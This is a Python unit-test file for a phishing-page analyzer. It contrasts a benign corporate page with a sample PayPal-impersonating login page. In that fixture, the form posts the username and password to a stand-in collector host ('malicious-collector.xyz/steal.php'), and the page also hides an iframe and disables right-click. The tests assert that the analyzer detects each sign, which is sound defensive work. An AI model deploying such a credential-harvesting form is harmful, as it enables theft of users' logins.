import unittest
from core.content_analyzer import analyze_page_content

class TestContentAnalyzer(unittest.TestCase):
    def test_benign_content(self):
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Legitimate Corporate Portal</title></head>
        <body>
            <h1>Welcome to Corporate Services</h1>
            <a href="/services">Services</a>
            <a href="/contact">Contact</a>
        </body>
        </html>
        """
        res = analyze_page_content("https://company.org", html_content=html)
        self.assertEqual(res['brand_impersonation'], None)
        self.assertEqual(res['has_password_field'], 0)
        self.assertLess(res['content_risk_score'], 20)

    def test_phishing_content(self):
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>PayPal - Login to your Account</title></head>
        <body>
            <h2>Verify Account</h2>
            <form action="http://malicious-collector.xyz/steal.php" method="POST">
                <input type="text" name="user">
                <input type="password" name="password">
                <input type="submit" value="Log In">
            </form>
            <iframe style="display:none" src="about:blank"></iframe>
            <script>
                document.oncontextmenu = function() { return false; };
            </script>
        </body>
        </html>
        """
        res = analyze_page_content("http://secure-update-paypal.cf", html_content=html)
        self.assertEqual(res['brand_impersonation'], "Paypal")
        self.assertEqual(res['has_password_field'], 1)
        self.assertEqual(res['form_action_suspicious'], 1)
        self.assertEqual(res['has_hidden_iframe'], 1)
        self.assertEqual(res['right_click_disabled'], 1)
        self.assertGreaterEqual(res['content_risk_score'], 80)
        self.assertGreater(len(res['findings']), 3)

if __name__ == '__main__':
    unittest.main()
